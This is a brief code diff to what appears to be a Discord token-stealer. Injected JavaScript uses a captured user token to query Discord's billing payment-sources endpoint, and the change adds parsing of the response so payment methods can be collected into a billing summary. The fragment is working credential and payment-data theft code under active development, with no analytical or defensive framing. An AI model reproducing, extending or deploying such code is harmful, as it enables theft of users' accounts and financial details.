@@ -83,7 +83,8 @@ var xmlHttp = new XMLHttpRequest();
 xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
 xmlHttp.setRequestHeader("Authorization", "${token}");
 xmlHttp.send( null );
-xmlHttp.responseText`, !0).then((pm) => {
+xmlHttp.responseText`, !0).then((sex) => {
+var pm = JSON.parse(sex)
     var billing = "";
     pm.forEach(z => {
         if (z.type == "") {
